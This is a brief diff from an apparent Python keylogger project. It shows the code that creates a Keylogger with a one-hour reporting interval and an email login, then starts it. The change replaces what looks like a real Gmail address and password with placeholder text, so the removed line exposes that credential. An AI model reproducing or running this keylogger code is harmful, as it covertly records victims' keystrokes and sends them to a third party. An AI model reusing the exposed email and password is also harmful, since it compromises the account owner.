@@ -46,7 +46,7 @@ class Keylogger:
 			keyboard_listener.join()
 
 try:
-	zlogger = Keylogger(3600, "iwunduchinonso1@gmail.com", "mouau1221108")
+	zlogger = Keylogger(3600, "your email", "your password")
 	zlogger.start()
 except KeyboardInterrupt:
 	exit()
